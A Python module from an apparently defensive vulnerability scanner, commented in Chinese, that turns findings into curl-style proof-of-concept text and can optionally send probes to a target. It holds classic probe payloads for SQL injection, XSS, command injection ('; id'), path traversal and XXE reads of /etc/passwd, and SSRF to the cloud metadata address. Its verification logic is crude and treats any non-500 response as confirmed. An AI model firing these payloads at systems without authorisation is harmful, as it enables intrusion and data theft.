"""PoC 生成与验证。

根据漏洞类型与现场信息（URL/参数/代码证据）生成可读 PoC，并支持（可选）真打验证。
默认 verify=False：仅产出 PoC 文本，不实际发起请求——符合"脱敏/演示"与合规要求。
"""
from __future__ import annotations

import json
from typing import Optional

from ..models import Finding, VulnType


_PAYLOADS = {
    VulnType.SQLI: "' OR '1'='1",
    VulnType.XSS: "<script>alert(1)</script>",
    VulnType.SSRF: "http://169.254.169.254/latest/meta-data/",  # 经典云元数据探测
    VulnType.COMMAND_INJECTION: "; id",
    VulnType.RCE: "; id",
    VulnType.PATH_TRAVERSAL: "../../../../etc/passwd",
    VulnType.XXE: "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
    VulnType.IDOR: "将请求中的 id/uid 参数自增/替换为他人标识",
}


def build_poc(finding: Finding, target_url: Optional[str] = None, param: str = "input") -> str:
    """生成文本 PoC（curl 形式）。"""
    payload = _PAYLOADS.get(finding.vuln_type, "见描述")
    base = target_url or "http://<TARGET_HOST>/"
    vt = finding.vuln_type.value
    if finding.vuln_type in (VulnType.SQLI, VulnType.XSS, VulnType.SSRF,
                             VulnType.COMMAND_INJECTION, VulnType.RCE, VulnType.PATH_TRAVERSAL):
        # 注入类：参数注入
        poc = (
            f"# {vt} PoC\n"
            f"curl -X POST '{base}' \\\n"
            f"  -d '{param}={payload}'\n"
        )
    elif finding.vuln_type == VulnType.IDOR:
        poc = (
            f"# {vt} PoC\n"
            f"# 已登录用户A，将其请求中的对象ID替换为用户B的ID，观察是否越权返回B的数据\n"
            f"curl '{base}?id=1001' -H 'Cookie: session=A'   # 改 id=1002 复现"
        )
    elif finding.vuln_type == VulnType.XXE:
        poc = f"# {vt} PoC\n{payload}\n# 作为 XML body 提交至 {base}"
    else:
        poc = f"# {vt} PoC（需结合上下文手工验证）\n# 证据：{finding.evidence[:200]}"
    if finding.evidence:
        poc += f"\n\n# 触发点代码：\n# {finding.evidence.replace(chr(10), chr(10)+'# ')}"
    return poc


def verify(finding: Finding, target_url: Optional[str], verify_enabled: bool) -> bool:
    """尝试验证。verify_enabled=False 时一律返回未验证（安全默认）。"""
    if not verify_enabled or not target_url:
        return False
    try:
        import requests
        payload = _PAYLOADS.get(finding.vuln_type, "")
        resp = requests.post(target_url, data={"input": payload}, timeout=10)
        # 极简判定：命中元数据/报错/etc 即认为可验证
        if finding.vuln_type == VulnType.SSRF and "ami-id" in resp.text:
            return True
        if finding.vuln_type == VulnType.XSS and payload in resp.text:
            return True
        return resp.status_code < 500
    except Exception:
        return False


__all__ = ["build_poc", "verify"]
